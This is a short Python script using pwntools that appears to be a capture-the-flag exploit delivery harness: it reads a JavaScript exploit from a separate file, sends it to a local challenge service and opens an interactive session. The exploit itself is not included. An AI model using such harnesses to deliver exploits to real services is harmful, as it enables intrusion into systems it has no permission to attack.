from pwn import *

with open("solve.js") as f:
    exploit = f.read()

io = remote('127.0.0.1', 11101)

io.sendlineafter(b'30001 bytes): ', str(len(exploit)).encode())
io.sendlineafter(b'Script:\n', exploit.encode())

io.recvuntil(b'Stdout:\n')

io.interactive()